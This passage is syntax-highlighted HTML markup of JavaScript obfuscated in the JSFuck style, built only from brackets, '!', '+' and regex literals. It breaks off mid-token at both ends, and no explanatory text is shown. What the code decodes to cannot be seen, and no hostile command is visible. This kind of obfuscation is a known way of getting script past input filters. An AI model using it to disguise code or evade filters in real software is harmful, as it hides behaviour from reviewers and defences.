operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'"'</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token 